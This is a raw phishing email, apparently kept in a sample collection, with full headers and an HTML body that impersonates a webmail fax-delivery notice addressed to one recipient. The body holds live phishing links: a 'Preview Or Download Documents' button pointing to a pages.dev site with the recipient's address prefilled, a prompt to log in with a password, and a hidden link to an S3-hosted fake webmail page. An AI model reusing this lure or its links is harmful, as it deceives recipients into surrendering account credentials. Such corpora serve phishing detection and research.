@@ -1,0 +1,258 @@
+Return-Path: ap-admin@flurdobenin.com
+Delivered-To: jose@monkey.org
+X-FDA: 82795851726.15.4738B17
+Received: from smtp.black.flurdobenin.com (smtp.black.flurdobenin.com
+ [185.249.196.30])	by imf10.b.hostedemail.com (Postfix) with ESMTP id
+ 15682A0007	for <jose@monkey.org>; Sun, 17 Nov 2024 14:41:57 +0000 (UTC)
+Authentication-Results: imf10.b.hostedemail.com;	dkim=pass
+ header.d=flurdobenin.com header.s=202410 header.b=PS2IdP5A;	spf=none
+ (imf10.b.hostedemail.com: domain of ap-admin@flurdobenin.com has no SPF
+ policy when checking 185.249.196.30) smtp.mailfrom=ap-admin@flurdobenin.com;
+	dmarc=pass (policy=quarantine) header.from=flurdobenin.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1731854531;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=Rx3wJJszMy++nHF9e0IFd0pBy3pc1knxrbO82LnYgUM=;
+	b=gipYbVuMKvbklJDgiCdoDUe6yJP1LgyY6klDn3pw9ENcRF/ta/tUY2zWv1l8VGrXeAk4Qv
+	grerlO2jxHG1ec8Mhcukmz1k/mpm6lklV2ThC0y2FMqCEVxkFioL9zq8DHkcNPWyz+U9r+
+	nq0XYnzLzM3ZL69HIYjCGcAAXS/9ZZY=
+ARC-Authentication-Results: i=1;	imf10.b.hostedemail.com;	dkim=pass
+ header.d=flurdobenin.com header.s=202410 header.b=PS2IdP5A;	spf=none
+ (imf10.b.hostedemail.com: domain of ap-admin@flurdobenin.com has no SPF
+ policy when checking 185.249.196.30) smtp.mailfrom=ap-admin@flurdobenin.com;
+	dmarc=pass (policy=quarantine) header.from=flurdobenin.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1731854531; a=rsa-sha256;
+	cv=none;
+	b=cO5DwsgmyeH3cNAV1fdsbHFUVn8rs0/FY37qWyxSCm7562L6A+AyHMf1EXjjUzDrr7GuHi
+	91a6nGgm+BH35QL2nBMpBPvXRx6NDhIk/PvUREyCsjDes7yAujiIeyIkb+h6SpP9s/Q70q
+	TVyDLVhHovl34ohhEwBn35YrZVKU4uM=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=flurdobenin.com;
+	s=202410; t=1731678126;
+	bh=Rx3wJJszMy++nHF9e0IFd0pBy3pc1knxrbO82LnYgUM=;
+	h=From:To:Subject:Date:From;
+	b=PS2IdP5A7ZxjI6WgmfjUfTs6G/IEfMDZt5bCnMTRrtqcoTiiXGVZ2mALkYPdx5evU
+	 IQVtScazIfBb0ZGPhkmX6fAejzJsU8fahSlBQhSMnDnUIbPO6usTFOe1dLf7vLHREB
+	 DsWqm+qzMxf5bsgdwrAahKA5eAvevv2/q4Jju93WlqTFAv+b/UF9sD6Lg3y95FTC9d
+	 TzLKinz0FPFd64P3IfRT57pjraiwqJFnnRlUdFQFpJguvvqaAu16fcDaEQTXojcchL
+	 wo8PxNdlD24CooDc9OiyDcf6khTclU1ekzOqemltWB2dtZHoBHy0X/Do5mkqB2vQxr
+	 6xwQcevKC/Jxg==
+Received: from [70.35.194.102] (unknown [70.35.194.102])
+	by smtp.black.flurdobenin.com (Postfix) with ESMTPA id 7DF6BF86E0
+	for <jose@monkey.org>; Fri, 15 Nov 2024 13:42:06 +0000 (UTC)
+From: monkey.org<ap-admin@flurdobenin.com>
+To: jose@monkey.org
+Subject: jose@monkey.org - YOU HAVE TWO NEW INCOMING FAX DOCUMENTS
+Date: 15 Nov 2024 13:42:06 +0000
+Message-ID: <20241115134205.87D1222578280B69@flurdobenin.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=7.27
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 15682A0007
+X-Stat-Signature: qokp645zyusnku9x43gonsqezhdj673y
+X-Rspam-User: 
+X-HE-Tag: 1731854517-806707
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18an6Kh+oqG0ghjqrWyJu3UL3TaO5pgthuZ+vJdjYqnhbj?=
+ =?utf-8?q?UP43CPfVkRovr77e4affZ+Ewue0oagr8QK8vGYUjnMNi8Hvj6K6K1ANoZksr4gp06?=
+ =?utf-8?q?Cev9xiCIsNTa2x4YouSOIdaA8fJs5kd0YbEU2Z4Qj+FiWUshCl1NjmQtNyRzPxQxN?=
+ =?utf-8?q?0ACfGMwweBc30LRP5ImlGaJ7a2Az2DfiLw4jTyofgsozu+9vTpGHAdKmMWG5yGgnT?=
+ =?utf-8?q?Nx14lkkSToDhXGtuHr2m/zcZ985PorsidmSZKXh3fFqMgkakAWGAaP/F8aEmlnj82?=
+ =?utf-8?q?C33i4E4iFSzrYLPcWC81l502GbC6n+hjDdeUNX4RXKs3AXmTPOlr2ac0WSAZVoPl5?=
+ =?utf-8?q?uTsApfbV4/MbYnZA8qVrU9QNAnr3afN94W5y7cjvLmSonrgOn80Qjnbuy6P3Us8fx?=
+ =?utf-8?q?Cb6lNAZm/HH7tvKCSQp11wcd26yzDCJxbRicQerd6cSuNUbrSYpuriGIwnTNgsxCQ?=
+ =?utf-8?q?04BHDKcQXCrKK7Vz4FwD9RrageKID8diRml27v2KTcOZV/wEX3nDJRh/ioow7a5fu?=
+ =?utf-8?q?fZDR9mt4pcwSYKjoQCdyOGGNQekSrPmEY63eqFPfGH7OWkJpJEz+k/w0xhqVWyDGd?=
+ =?utf-8?q?c805tkIofCzd7jWbWOU5nqU4dgxy3CpqUwJnbLk2MLMmfKwur6hLp1na6lR9Js1Dc?=
+ =?utf-8?q?+PJ6zgSlWYS4LXqmgV/lO4SqHuwWk8sThH4eFBaA4LMLCnK82q/I8Nkc2CPat3p+I?=
+ =?utf-8?q?aEekw+iHHXl7qLLtmvw6HOHmfCuEMsNUJJtJqMSo1uw+4TgtlpgVgPKTMMH+XFrB+?=
+ =?utf-8?q?Zkb+g0jzolqqefNeWDv0XA9q0nN7+eXtIegpwLgm/6ypj/2LCeu0iaVa6gDan8Fw+?=
+ =?utf-8?q?293N6A/UjZ9VVZhAXI9ZUyEempwRdt0LH0EWyVpldff/LpDvcFKs6oOk6BdEEnP97?=
+ =?utf-8?q?B8cialOO9Qasyv8q1bVuVS_PS8jy3wGbrhYX2rxF9rd96Egy6CoKUeIMjeIBqfryW?=
+ =?utf-8?q?DlgwPYfGzi6npUnYguMmA6LJqPeMLps77Ix62sbFU3At1Uam1GWhq2tfLT8KzjGSh?=
+ =?utf-8?q?j98SZJfNx0Yk+S4ySfe/cnvec+JtgVy2j+E2OhYVI87+rdNViDZ2GCD+NUDAd+SIU?=
+ =?utf-8?q?fHTUwcV2bNzWVpdFtiPCGzlKsJqQPzAdULWyhEW5y3kqDZ+f/74ftSo3Y7VptYnhE?=
+ =?utf-8?q?fNjHsWT3sWaQ0fTKPx3Bwa8r5VKqZWj8vs86CFRhiHGTteQXPyBDNl7Fx1xrKdt7i?=
+ =?utf-8?q?b8cpgtZ9S7o2WcbXZLbweTvL/3/PQCfhk28ABV7EvSvIftCcmrd/Z0wBQZnsMXAmC?=
+ =?utf-8?q?+xXJkdST45x4+99iEcBZD9RrBCAqj6iQmNSSA0I/AB4eH6CnqMBl1OpEfrDfIXECx?=
+ =?utf-8?q?2shvAm3muYBUr+6NcwLuV0NJ3dU6ii4dngmLN5s0sMjkdBQQLNkyZHPVLjDDGMbBW?=
+ =?utf-8?q?wOxV6MOPDSbOIo/lPBwcfj8/+lDKWSmbHHS6722G7WO1GAFE9tA9u9N6+LZDdTdHx?=
+ =?utf-8?q?2vVqqFPyvJo1klpz3lVLsR0CJR3qc2QdnGWZEmiuf+n86Hue+Bs?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 352
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta http-equiv=3D"content-type" content=3D"text/html; charset=3DISO-8859-=
+1">
+<title>webmail</title>
+</head>
+<body>
+<p align=3D"center" style=3D"border-color: rgb(238, 238, 238); text-align: =
+center; color: rgb(64, 82, 171); text-transform: none; text-indent: 0px; le=
+tter-spacing: normal; font-family: Roboto,sans-serif; font-size: 14px; font=
+-style: normal; font-weight: bold; margin-top: 0px; word-spacing: 0px; whit=
+e-space: normal; orphans: 2; widows: 2;">YOU HAVE TWO NEW INCOMING FAX DOCU=
+MENTS</p>
+<hr style=3D"height: 0px; text-align: left; color: rgb(85, 85, 85); text-tr=
+ansform: none; text-indent: 0px; letter-spacing: normal; overflow: visible;=
+ font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-=
+weight: 400; word-spacing: 0px; border-right-color: currentColor; border-bo=
+ttom-color: currentColor; border-left-color: currentColor; border-right-wid=
+th: 0.5px; border-bottom-width: 0.5px; border-left-width: 0.5px; border-rig=
+ht-style: none; border-bottom-style: none;=20
+border-left-style: none; white-space: normal; orphans: 2; widows: 2;"><br s=
+tyle=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb(85, =
+85, 85); text-transform: none; text-indent: 0px; letter-spacing: normal; fo=
+nt-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-wei=
+ght: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;">
+<span style=3D"border-color: rgb(238, 238, 238); text-align: center; color:=
+ rgb(34, 34, 34); text-transform: none; text-indent: 0px; letter-spacing: n=
+ormal; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal;=
+ font-weight: bold; text-decoration: underline; word-spacing: 0px; white-sp=
+ace: normal; orphans: 2; widows: 2;">Delivery
+Notification Information:</span><span style=3D"text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; float: none; display: inline !important; =
+white-space: normal; orphans: 2; widows: 2;"></span>
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<table style=3D"border-color: rgb(238, 238, 238); text-align: left; color: =
+rgb(85, 85, 85); text-transform: none; letter-spacing: normal; font-family:=
+ Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal; border-collapse: collapse; orphans:=
+ 2; widows: 2;">
+<tbody style=3D"border-color: rgb(238, 238, 238);">
+<tr style=3D"border-color: rgb(238, 238, 238);">
+<td style=3D"border-color: rgb(238, 238, 238);"><span style=3D"border-color=
+: rgb(238, 238, 238); text-align: center; font-weight: bold;">Message
+ID :</span></td>
+<td style=3D"border-color: rgb(238, 238, 238);"><span style=3D"border-color=
+: rgb(238, 238, 238); text-align: center;">7030716SG</span></td>
+</tr>
+<tr style=3D"border-color: rgb(238, 238, 238);">
+<td style=3D"border-color: rgb(238, 238, 238);"><span style=3D"border-color=
+: rgb(238, 238, 238); text-align: center; font-weight: bold;">Page
+Count :</span></td>
+<td style=3D"border-color: rgb(238, 238, 238);"><span style=3D"border-color=
+: rgb(238, 238, 238); text-align: center;">2</span></td>
+</tr>
+<tr style=3D"border-color: rgb(238, 238, 238);">
+<td style=3D"border-color: rgb(238, 238, 238);"><span style=3D"border-color=
+: rgb(238, 238, 238); text-align: center; font-weight: bold;">Remote
+CSID :</span></td>
+<td style=3D"border-color: rgb(238, 238, 238);"><span style=3D"border-color=
+: rgb(238, 238, 238); text-align: center;">(803-428-1501)</span></td>
+</tr>
+</tbody>
+</table>
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<span style=3D"border-color: rgb(238, 238, 238); text-align: center; color:=
+ rgb(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: n=
+ormal; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wido=
+ws: 2;">
+<a style=3D"border-color: rgb(238, 238, 238); padding: 10px; color: rgb(255=
+, 255, 255); line-height: 35px; font-size: 17px; text-decoration: none; bac=
+kground-color: rgb(64, 82, 171);" href=3D"https://wyshflrlf--tuyr87749--kkf=
+kf.pages.dev/?username=3Djose@monkey.org" rel=3D"noreferrer" _blank"=3D"">P=
+review
+Or Download Documents</a></span><span style=3D"text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; float: none; display: inline !important; =
+white-space: normal; orphans: 2; widows: 2;"></span>
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<b style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb(=
+85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: normal=
+; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font=
+-weight: bolder; word-spacing: 0px; white-space: normal; orphans: 2; widows=
+: 2;">NB:<span>&nbsp;</span></b>
+<span style=3D"text-align: left; color: rgb(85, 85, 85); text-transform: no=
+ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto,sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; float: none; display: inline !important; white-space: normal; orphans: 2;=
+ widows: 2;">This
+notification will expire on the 2024-11-15.</span><br style=3D"border-color=
+: rgb(238, 238, 238); text-align: left; color: rgb(85, 85, 85); text-transf=
+orm: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto,sa=
+ns-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2;">
+<span style=3D"text-align: left; color: rgb(85, 85, 85); text-transform: no=
+ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto,sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; float: none; display: inline !important; white-space: normal; orphans: 2;=
+ widows: 2;">Login
+in with your password</span><br style=3D"border-color: rgb(238, 238, 238); =
+text-align: left; color: rgb(85, 85, 85); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Roboto,sans-serif; font-size: 1=
+4px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: =
+normal; orphans: 2; widows: 2;">
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<br style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rgb=
+(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2;">
+<div style=3D"border-color: rgb(238, 238, 238); text-align: left; color: rg=
+b(85, 85, 85); text-transform: none; text-indent: 0px; letter-spacing: norm=
+al; font-family: Roboto,sans-serif; font-size: 11px; font-style: normal; fo=
+nt-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows:=
+ 2;"><span></span><span></span><span></span><span></span><span></span>
+<a style=3D"border-color: rgb(238, 238, 238); color: rgb(85, 85, 85); text-=
+decoration: none; background-color: transparent;" href=3D"https://s3.amazon=
+aws.com/appforest_uf/f1679655264683x681638328473694800/webmailfe.html#sales=
+@btsurgicals.com" target=3D"_blank" rel=3D"noreferrer"><br>
+</a></div>
+
+
+
+</body></html>
+
